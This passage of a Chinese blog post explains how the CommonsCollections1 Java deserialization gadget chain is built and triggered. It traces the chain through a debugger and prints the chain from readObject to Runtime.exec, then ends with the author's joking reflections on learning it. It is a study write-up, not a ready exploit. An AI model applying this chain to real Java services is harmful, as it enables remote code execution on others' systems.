&lt;p&gt;可以看出此处是通过反射获取 AnnotationInvocationHandler 对象，且获取对象时传入了构造的 LazyMap&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;38.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;createProxy(handler,iface,ifaces)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对传入的 iface 进行代理，并传入上一步获得的 AnnotationInvocationHandler 对象 handler2&lt;/p&gt;
&lt;p&gt;iface 为传入的 Map.class (CommonsCollections1.java 中： &lt;code&gt;mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;39.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;两次函数执行完毕后，返回 CommonsCollections1&lt;/p&gt;
&lt;p&gt;返回代理对象 mapProxy（调用该对象任意方法，都会先调用传入的 handler#invoke）&lt;/p&gt;
&lt;p&gt;73 行代码将获取到的 mapProxy 进行包裹是因为：&lt;/p&gt;
&lt;p&gt;​	由于反序列化入口为 readObject，所以我们需要某个类的 readObject 中会调用传入 map 的任意方法&lt;/p&gt;
&lt;p&gt;​	AnnotationInvocationHandler#readObject 中有调用 map.entrySet ()&lt;/p&gt;
&lt;p&gt;​	从而触发 AnnotationInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后返回层层构造好的，还没有序列化的，payload 啦&lt;/p&gt;
&lt;h2 id=&#34;payload触发分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payload触发分析&#34;&gt;#&lt;/a&gt; payload 触发分析&lt;/h2&gt;
&lt;p&gt;以下是 POC 中给出的触发链，可以根据 Gadget 下断点（这样比较清晰感觉）&lt;/p&gt;
&lt;p&gt;根据上面 payload 构造的学习，我们可以更好的理解该利用链的触发&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Gadget chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		ObjectInputStream.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;			AnnotationInvocationHandler.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;				Map(Proxy).entrySet()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					AnnotationInvocationHandler.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;						LazyMap.get()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;							ChainedTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								ConstantTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Class.getMethod()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.getRuntime()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.exec()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Requires:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		commons-collections&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先从 PayloadRunner38 行进入反序列化&lt;/p&gt;
&lt;p&gt;其中 serialized 是我们序列化后的 payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 ObjectInputStream#readObject&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;42.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 AnnotationInvocationHandler#readObject 处下断点，查看调用栈&lt;/p&gt;
&lt;p&gt;观察到在 ObjectInputStream 中通过反射调用了 AnnotationInvocationHandler#readObject&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 AnnotationInvocationHandler#readObject&lt;/p&gt;
&lt;p&gt;此处 memberValues 为我们传入的代理对象 proxyMap&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;45.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;调用其任意方法，就会进入 AnnotationInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;这里要进入函数一直点点点，其中会多次返回该行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;直到再次进入 AnnotationInvocationHandler#readObject，运行至 355 行进入函数，会跳转至 AnnotationInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;47.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看当前函数调用栈&lt;/p&gt;
&lt;p&gt;handler1 的 readObject -&amp;gt; 代理对象的 entrySet -&amp;gt; handler2 的 invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;48.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造 handler2 时，传入的 Map 对象就是我们构造好的 LazyMap&lt;/p&gt;
&lt;p&gt;此时只要有调用 LazyMap#get，就会执行 transform&lt;/p&gt;
&lt;p&gt;查看当前变量，this.memberValues 就是 LazyMap 对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;往下滑滑滑滑滑&lt;/p&gt;
&lt;p&gt;在 78 行找到 &lt;code&gt;this.memberValues.get(var4)&lt;/code&gt;  啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;调试进入 LazyMap#get，其中当获取的 key 不存在时，会进入 if 代码块调用我们构造好的 transform&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看变量，执行的 transform 就是我们构造好的，会通过反射获取函数执行命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;53.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看函数调用栈，和分析中相同&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;调到这里就完成触发啦:happy:&lt;/p&gt;
&lt;p&gt;⭐碰见了很多奇奇怪怪的问题，比如根本不会跳进 LazyMap#get 中 if 中的代码块，或者还没到这就已经弹窗了，或者细调时根本不会弹窗… 困扰了我很久😪&lt;/p&gt;
&lt;p&gt;但是正常运行是没有问题的，所以我取消了所有除此之外的断点，查看函数调用栈和变量都 OK 了&lt;/p&gt;
&lt;p&gt;所以感觉应该是 debug 在实现自身功能时有影响到正常代码的触发，这里说明一下啦&lt;/p&gt;
&lt;h1 id=&#34;哔哔哔口水总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#哔哔哔口水总结&#34;&gt;#&lt;/a&gt; 哔哔哔口水总结&lt;/h1&gt;
&lt;p&gt;看 p 神的文章，一点一点仔细看了一遍&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;54.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后脑袋瓜子就糊了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;55.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后就从 URLDNS 开始再看一遍&lt;/p&gt;
&lt;p&gt;然后发现哇塞&lt;/p&gt;
&lt;p&gt;URLDNS 真的好简单耶&lt;/p&gt;
&lt;p&gt;怎么会有人看不懂这么简单的原理呀不会把不会吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;57.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后看 cc1，把 payload 原理又看了一遍，什么 transform 也太简单了把，不就是这样吗，这有什么难度吗？？？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;58.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后看触发原理调试的时候就是这样了 (beiwei)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;由其是还碰见了调试上的问题&lt;/p&gt;
&lt;p&gt;左左右右调试了一两个星期把&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;60.jpeg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;一直想把整个过程简洁优雅的总结出来，所以不断地总结总结，画图记笔记…&lt;/p&gt;
&lt;p&gt;因为能简单的把问题解释清楚才能证明自己是真的理解了（不然就和第一遍看 p 大文章的情况一样了）&lt;/p&gt;
&lt;p&gt;然后调完了理解了总结了记笔记了，我又行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;58.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这也太简单了吧&lt;/p&gt;
&lt;p&gt;不会吧不会吧会难道还有人看不懂 cc1 吗&lt;/p&gt;
&lt;p&gt;以上作死的行为只是想提醒自己，很多很难的知识点一定要自己动手去试，多总结，一定要写文章记录下来（年纪大了真的会忘的），细节不要放过，一点一点抠&lt;/p&gt;
&lt;p&gt;我真的不是小天才，我只是个小神仙罢了，唉&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;61.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;下图是在理解触发原理时自己写的一个大概的流程（尽量简洁但是不是很简洁）&lt;/p&gt;
&lt;p&gt;看不看得懂就看缘分了😴&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;60.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
